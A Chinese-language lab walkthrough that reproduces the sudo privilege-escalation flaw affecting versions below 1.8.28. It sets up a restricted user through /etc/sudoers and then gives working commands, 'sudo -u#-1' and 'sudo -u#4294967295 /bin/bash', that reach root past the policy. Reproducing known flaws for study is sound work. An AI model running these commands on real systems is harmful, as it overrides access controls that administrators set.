## 一、漏洞分析

 **1.该漏洞于2019年10月14日，被Sudo官方发布**

 **2.该漏洞的用处：使受限制的sudo权限用户，可不受限制运行root命令**

## 二、漏洞复现

1.漏洞的环境：

漏洞的影响| 漏洞的使用前提| 我的ubuntu镜像网盘链接地址| 提取码| 我的unbuntu  
---|---|---|---|---  
sudo的版本低于1.8.28| 一个用户可以执行sudo命令，但是会被限制|
链接：https://pan.baidu.com/s/1SQI_SCJDLoVrgSL4mH3DGg| iks4| 进入快照2，为原始快照  
  
2.漏洞的环境复现：  
①输入以下命令，查看当前sudo 的版本；  
进入root用户：`sudo su```  
查看当前sudo的版本：`sudo -V``  
![1667795213_6368890d4a023b893acae.png!small?1667795213290](https://image.3001.net/images/20221107/1667795213_6368890d4a023b893acae.png!small?1667795213290)/如上图所示，版本为1.8.16，可以进行漏洞复现`

②建立一个用户ming；  
输入以下命令创建用户ming： `useradd ming`  
为用户ming设置密码123456： `passwd ming`（输入两次123456，即可设置成功）

![1667795266_63688942af3cd9fd5c822.png!small?1667795266721](https://image.3001.net/images/20221107/1667795266_63688942af3cd9fd5c822.png!small?1667795266721)`③给用户ming赋予他执行sudo的权限  
第一步：首先要查看一下/etc/sudoers的权限： ll
/etc/sudoers`![1667795360_636889a0d1fe259c68a98.png!small?1667795360804](https://image.3001.net/images/20221107/1667795360_636889a0d1fe259c68a98.png!small?1667795360804)

//如上图所示：所属者root，权限只有可读，没有可写，为了修改该文件，赋予权限喽

第二步：输入以下命令，赋予权限：`chmod u+w /etc/sudoers`

![1667795399_636889c7118eb282627b1.png!small?1667795399085](https://image.3001.net/images/20221107/1667795399_636889c7118eb282627b1.png!small?1667795399085)

//如上图所示，已经修改完成，现在root用户具有可写权限

第三步：修改/etc/sudoers文件,给用户ming赋予sudo权限  
编辑该文件：`vi /etc/sudoers`

![1667795458_63688a02d8937a1367b3f.png!small?1667795458877](https://image.3001.net/images/20221107/1667795458_63688a02d8937a1367b3f.png!small?1667795458877)

给ming用户赋予sudo权限： ming ALL=(ALL:ALL) ALL  
给ming用户设置安全策略：比如以下命令，我们期望用户ming
可以以管理员权限执行/usr/bin、/bin下的所有命令，但是不能修改其他用户密码以及kill其他用户进程，可以配置如下： ming
ALL=/usr/bin/, !/usr/bin/passwd, /bin/, !/bin/kill  
// **之后的漏洞利用，可以获得root权限，从而略过该安全策略。**

![1667795513_63688a393ea83ab0824fb.png!small?1667795513309](https://image.3001.net/images/20221107/1667795513_63688a393ea83ab0824fb.png!small?1667795513309)

 **ming ALL=这里加上 !/usr/bin/su, !/bin/su 为了禁止用户ming，直接切换到root**

④切换用户到ming；  
输入命令： `su - ming`

![1667795579_63688a7bcae953c816d47.png!small?1667795579757](https://image.3001.net/images/20221107/1667795579_63688a7bcae953c816d47.png!small?1667795579757)

注意：在修改/etc/sudoers完成后，输入以下命令，取出可写权限：`chmod u-w /etc/sudoers`  
⑤验证该ming用户的权限：

![1667795599_63688a8f68e79d5387b3a.png!small?1667795599487](https://image.3001.net/images/20221107/1667795599_63688a8f68e79d5387b3a.png!small?1667795599487)

 **3.开始提权**  
①输入以下命令：  
回显0：`sudo -u#-1 id -u`  
回显0：`sudo -u#4294967295 id -u`  
输入命令提权：`sudo -u#4294967295 /bin/bash`

![1667795650_63688ac2b8fdc9fb5a834.png!small?1667795650745](https://image.3001.net/images/20221107/1667795650_63688ac2b8fdc9fb5a834.png!small?1667795650745)

 **//如图所示，提权成功！！！！！！**

我们之前，做了安全策略，对于ming用户不可以修改其它用户密码；  
那么我们现在提权为root，那么就可以修改密码了。

![1667795672_63688ad831e9283d54808.png!small?1667795672144](https://image.3001.net/images/20221107/1667795672_63688ad831e9283d54808.png!small?1667795672144)

## 三、总结

 **1.背景：有sudo权限用户，但是被安全策略所限制，不能su切换到root，也不能改别人的密码，不能杀死进程等等…  
2.提权：sudo的版本低于1.8.28 时候，我们直接提权为root**

``

